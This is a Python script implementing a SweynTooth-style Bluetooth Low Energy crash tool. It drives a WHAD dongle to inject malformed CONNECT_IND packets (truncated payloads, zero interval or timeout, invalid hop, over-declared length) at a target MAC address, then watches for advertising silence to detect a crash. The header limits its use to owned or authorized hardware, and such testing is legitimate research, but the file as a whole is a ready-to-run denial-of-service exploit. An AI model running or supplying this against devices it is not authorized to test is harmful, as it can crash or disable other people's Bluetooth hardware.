#!/usr/bin/env python3
# ============================================================================
#  sweyntooth_crash.py - SweynTooth-style CONNECT_IND malformed-packet crasher
#  on our WHAD/ButteRFly dongle (raw_inject path).
#
#  Usage:
#     python3 sweyntooth_crash.py C0:00:00:41:73:AC
#     python3 sweyntooth_crash.py C0:00:00:41:73:AC --vectors trunc26,hop0
#     python3 sweyntooth_crash.py C0:00:00:41:73:AC --list
#
#  Vectors (from SweynTooth CC2540 CVE methodology):
#    trunc0/12/18/26 : payload PHYSICALLY truncated to N bytes (Length+buffer
#                      +CRC all consistent -> "legal shape, missing fields")
#    iv0             : interval=0  (zero connection interval)
#    to0             : timeout=0   (zero supervision timeout)
#    hop0            : hop=0       (spec requires 5-16)
#    over247         : Length=247 over-declared on a 34B payload
#
#  Oracle: advertising silence. gap ~2s = accepted(our timeout); no ADV
#  within window = CRASH-LIKELY (then wait for reboot/recovery).
#  OWN HARDWARE / AUTHORIZED TARGETS ONLY - this is a DoS tool.
# ============================================================================
import argparse, glob, os, re, statistics, sys, time
from whad.device import WhadDevice
from whad.ble.connector import Injector
from scapy.layers.bluetooth4LE import BTLE, BTLE_ADV, BTLE_CONNECT_REQ, BTLE_SCAN_REQ

INITA      = "5d:36:ac:90:0b:22"     # our claimed central (random static, like SweynTooth's)
AA         = 0xD4C3B2A1
CRCINIT    = 0x563412
ADV_AA     = 0x8E89BED6
T0 = time.time()
def log(m): print(f"[{time.time()-T0:6.2f}s] {m}", flush=True)

def mac_wire(s): return bytes.fromhex(s.replace(":", ""))[::-1]

def base_conn(target):
    return BTLE() / BTLE_ADV(RxAdd=0, TxAdd=1) / BTLE_CONNECT_REQ(
        InitA=INITA, AdvA=target, AA=AA, crc_init=CRCINIT,
        win_size=2, win_offset=0, interval=24, latency=0, timeout=200,
        chM=0x1FFFFFFFFF, hop=13, SCA=1)

def frame(pdu_bytes):  return BTLE(bytes.fromhex("D6BE898E") + pdu_bytes)

def make_vectors(target):
    v = {}
    full = base_conn(target)
    fpdu = bytes(full[BTLE_ADV:])                     # 36B PDU (hdr+34)
    def trunc(n, name):
        v[name] = frame(fpdu[:2+n])                   # physically cut buffer
    trunc(0,  "trunc0"); trunc(12, "trunc12"); trunc(18, "trunc18"); trunc(26, "trunc26")
    iv0 = base_conn(target);  iv0[BTLE_CONNECT_REQ].interval = 0
    to0 = base_conn(target);  to0[BTLE_CONNECT_REQ].timeout  = 0
    hop0 = base_conn(target); hop0[BTLE_CONNECT_REQ].hop     = 0
    ov  = base_conn(target);  ov[BTLE_ADV].Length            = 247
    v["iv0"], v["to0"], v["hop0"], v["over247"] = frame(bytes(iv0[BTLE_ADV:])), \
        frame(bytes(to0[BTLE_ADV:])), frame(bytes(hop0[BTLE_ADV:])), frame(bytes(ov[BTLE_ADV:]))
    v["valid34"] = frame(fpdu)                        # control: must do nothing
    return v

def open_inj(tries=6):
    for i in range(tries):
        for port in ("uart0","uart1"):
            try:
                d = WhadDevice.create(port); ij = Injector(d)
                try: ij.enable_scan_mode()
                except Exception: pass
                try: ij.start()
                except Exception: pass
                return d, ij, port
            except Exception: pass
        log(f"  open retry {i+1}/{tries} ..."); time.sleep(1.5)
    return None, None, None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("mac")
    ap.add_argument("--vectors", default="trunc0,trunc12,trunc18,trunc26,iv0,to0,hop0,over247,valid34")
    ap.add_argument("--shots", type=int, default=3)
    ap.add_argument("--window", type=float, default=7.0, help="silence=crash seconds")
    ap.add_argument("--list", action="store_true")
    a = ap.parse_args()
    m = re.sub(r"[:\-\s]","",a.mac).lower()
    if not re.fullmatch(r"[0-9a-f]{12}", m): log("[FAIL] bad MAC"); sys.exit(2)
    target = ":".join(m[i:i+2] for i in range(0,12,2)).upper()
    vecs = make_vectors(target)
    if a.list:
        print("vectors:", ", ".join(vecs)); sys.exit(0)
    use = [v.strip() for v in a.vectors.split(",") if v.strip() in vecs]

    d, ij, port = open_inj()
    if not ij: log("[FAIL] dongle will not open"); sys.exit(2)
    log(f"dongle on {port} | target {target} | {len(use)} vectors x {a.shots} shots")
    AW = mac_wire(target)
    ev = {"t": [], "scanrsp": False}
    orig = ij.on_adv_pdu
    def hook(pkt,*x,**k):
        try:
            b = bytes(pkt)
            if AW in b: ev["t"].append(time.time()); del ev["t"][:-600]
        except Exception: pass
        try: return orig(pkt,*x,**k)
        except Exception: return None
    ij.on_adv_pdu = hook

    # baseline rhythm
    t = time.time()
    while time.time()-t < 5: time.sleep(0.05)
    if not ev["t"]:
        log("[FAIL] target not advertising -> pairing mode, rerun"); sys.exit(3)
    ivs = [b-c for c,b in zip(ev["t"],ev["t"][1:]) if 0.02 < b-c < 5]
    med = statistics.median(ivs) if len(ivs) >= 3 else 1.0
    acc_thr, crash_thr = max(1.2, 2*med), max(a.window, 4*med)
    log(f"baseline ADV median {med*1000:.0f} ms | accept-thr {acc_thr:.1f}s crash-thr {crash_thr:.1f}s")

    results = []
    for name in use:
        lit = vecs[name]
        log(f"--- VECTOR {name} ({len(bytes(lit))-4}B PDU on air) ---")
        fired, mark = 0, 0.0
        dl = time.time()+25
        while fired < a.shots and time.time() < dl:
            if ev["t"] and time.time()-ev["t"][-1] < 0.6 and time.time()-mark > 0.4:
                try: ij.raw_inject(lit); fired += 1; mark = time.time()
                except Exception as e: log(f"  tx err: {type(e).__name__}: {e}"); break
                time.sleep(0.3)
            time.sleep(0.01)
        # oracle
        t0, gap_start, gap_end = time.time(), None, None
        while time.time()-t0 < crash_thr + 12:
            now, la = time.time(), (ev["t"][-1] if ev["t"] else 0)
            if gap_start is None:
                if now-la > acc_thr: gap_start = la
            elif la > gap_start:
                gap_end = la-gap_start; break
            time.sleep(0.05)
        if gap_start is None:   verdict = "NO EFFECT (advertising uninterrupted)"
        elif gap_end and gap_end < crash_thr: verdict = f"ACCEPTED-likely (gap {gap_end:.1f}s ~ our 2s timeout)"
        elif gap_end:           verdict = f"long outage {gap_end:.1f}s then resumed"
        else:                   verdict = f"CRASH-LIKELY (silent > {crash_thr:.0f}s)"
        results.append((name, fired, verdict)); log(f"  => {verdict}")
        if "CRASH" in verdict:
            log("  waiting 25s for recovery/reboot ...")
            pre = len(ev["t"]); tw = time.time()+25
            while time.time() < tw:
                if len(ev["t"]) > pre: log("  device recovered (it rebooted!)"); break
                time.sleep(0.2)
            else: log("  STILL SILENT -> power-cycle the device manually")
        time.sleep(1.0)
    log("="*60)
    for n,f,v in results: log(f"  {n:<10} shots={f}  {v}")
    log("="*60)
    with open(f"crash_{int(time.time())}.txt","w") as fh:
        for n,shots,v in results: fh.write(f"{n} shots={shots} {v}\n")
    log("saved -> crash_*.txt")
    try: d.close()
    except Exception: pass

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: sys.exit(130)
